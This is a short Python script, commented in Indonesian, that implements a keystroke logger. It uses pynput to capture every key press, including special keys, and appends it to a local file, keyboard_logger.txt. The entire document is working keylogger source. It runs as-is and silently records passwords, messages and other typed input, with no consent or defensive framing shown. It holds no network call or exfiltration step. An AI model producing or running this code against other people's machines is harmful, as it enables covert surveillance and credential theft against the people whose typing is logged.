from pynput import keyboard  # Mengimpor modul untuk menangani event keyboard

LOG_FILE = "keyboard_logger.txt"  # Menentukan nama file untuk menyimpan log

# Fungsi untuk menangani event ketika tombol ditekan
def on_press(key):
    with open(LOG_FILE, "a") as f:  # Membuka file log dalam mode append
        text = ""  # Inisialisasi variabel untuk menyimpan input dari keyboard
        try:
            text += f"{key.char}"  # Menambahkan karakter yang ditekan ke variabel text
        except AttributeError:
            skey = f"{key}"  # Jika karakter yang ditekan adalah tombol khusus
            if "Key." in skey:
                text += f"<{skey.replace('Key.', '')}>"  # Menghapus prefix 'Key.' untuk tombol khusus
            else:
                text += f"{skey}"  # Menyimpan tombol yang tidak dapat dikonversi ke string

        f.write(text + " ")  # Menyimpan input ke file log

# Fungsi untuk menangani event ketika tombol dilepas
def on_release(key):
    return True  # Mengembalikan nilai True untuk melanjutkan pendengaran event

# Menginisialisasi listener untuk menangani penekanan dan pelepasan tombol
with keyboard.Listener(
    on_press=on_press,  # Menentukan fungsi yang dipanggil ketika tombol ditekan
    on_release=on_release  # Menentukan fungsi yang dipanggil ketika tombol dilepas
) as listener:
    listener.join()  # Menjalankan listener hingga event dihentikan
